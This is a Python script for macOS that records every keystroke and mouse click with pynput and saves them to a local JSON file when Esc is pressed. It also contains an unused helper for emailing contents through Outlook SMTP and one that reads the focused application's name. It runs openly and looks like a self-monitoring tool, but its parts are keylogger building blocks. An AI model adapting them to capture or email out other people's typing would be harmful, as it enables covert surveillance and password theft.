#!/usr/bin/env python3

from AppKit import NSWorkspace
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import json
from pynput import keyboard, mouse
import smtplib

"""
    MISCELLANEOUS
"""

def timestamp():
    right_now = datetime.now()
    return right_now.strftime('%d/%m/%Y - %H:%M')

def sort_dict_descending_keys(dictionary):
    return sorted(dictionary.items(), key=lambda pair: pair[1], reverse=True)

"""
    EMAIL SENDING
"""

def construct_mime(email_address, contents):
    message = MIMEMultipart()
    message['From'] = email_address
    message['To'] = email_address
    message['Subject'] = timestamp()
    message.attach(MIMEText(contents, 'plain'))
    
    return message

def send_email(email_address, password, contents):
    server = smtplib.SMTP(host='smtp-mail.outlook.com', port=587)
    server.starttls()
    server.login(email_address, password)

    mime_object = construct_mime(email_address, contents)
    server.send_message(mime_object)

    server.quit()

"""
    APPLICATION TRACKING
"""

def get_focus_app_string():
    workspace = NSWorkspace.sharedWorkspace()
    return workspace.activeApplication()['NSApplicationName']

"""
    MONITORING
"""

class Monitor:
    passphrase = "I'm fishing in the river champion!"

    def __init__(self):
        # state variables
        self.logs = list()
        self.text = str()
        
        # listeners
        self.keys = keyboard.Listener(on_press=self.on_press)
        self.mice = mouse.Listener(on_click=self.on_click)
    
    def record_raw_input(self, input_dict):
        # only record text if it's not empty
        if self.text:
            self.logs.append({'o' : self.text})
            self.text = str()
        self.logs.append(input_dict)

    def on_press(self, key):
        if (key == keyboard.Key.esc):
            if self.text:
                self.logs.append({'o' : self.text})
            self.mice.stop()
            return False
        
        try:
            self.text += key.char
        # when we hit a special character we update all regular text
        except AttributeError:
            self.record_raw_input({'s' : key.name.upper()})

    # pass in x and y to follow expected parameters of on_click
    def on_click(self, x, y, button, pressed):
        if (pressed):
            self.record_raw_input({'m' : button.name.upper()})

    def run(self):
        self.keys.start()
        self.mice.start()
        
        print('ready!')
        self.keys.join()
        self.mice.join()
        with open('logs.json', 'w') as f:
            f.write(json.dumps(self.logs, indent=4))
        
def main():
    monitor = Monitor()
    monitor.run()

if __name__ == '__main__':
    main()
